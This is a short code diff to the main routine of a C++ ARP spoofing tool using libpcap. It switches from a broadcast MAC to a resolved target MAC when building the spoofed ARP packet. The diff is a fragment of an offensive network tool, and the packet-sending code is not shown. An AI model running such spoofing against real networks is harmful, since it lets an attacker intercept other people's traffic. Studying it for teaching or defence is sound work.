@@ -2,6 +2,7 @@
 #include <cstdlib>
 #include <pcap.h>
 #include <string>
+#include <pthread.h>
 #include "arp-spoof.h"
 
 void usage() {
@@ -33,9 +34,15 @@ int main(int argc, char* argv[]) {
         Ip senderIp(argv[i]);
         Ip targetIp(argv[i + 1]);
         Mac senderMac;
+        Mac targetMac;
 
-        if (!getSenderMac(pcap, senderMac, senderIp)) {
+        if (!getMac(pcap, senderMac, senderIp)) {
             fprintf(stderr, "[-] Failed to get sender MAC for %s\n", std::string(senderIp).c_str());
+            continue;
+        }
+
+        if (!getMac(pcap, targetMac, targetIp)) {
+            fprintf(stderr, "[-] Failed to get target MAC\n");
             continue;
         }
 
@@ -43,7 +50,7 @@ int main(int argc, char* argv[]) {
         spoofpair.senderIp = senderIp;
         spoofpair.targetIp = targetIp;
         spoofpair.senderMac = senderMac;
-        spoofpair.targetMac = Mac("ff:ff:ff:ff:ff:ff");
+        spoofpair.targetMac = targetMac;
 
         if (!sendArpSpoof(spoofpair)) {
             fprintf(stderr, "[-] Failed to send ARP spoof packet\n");
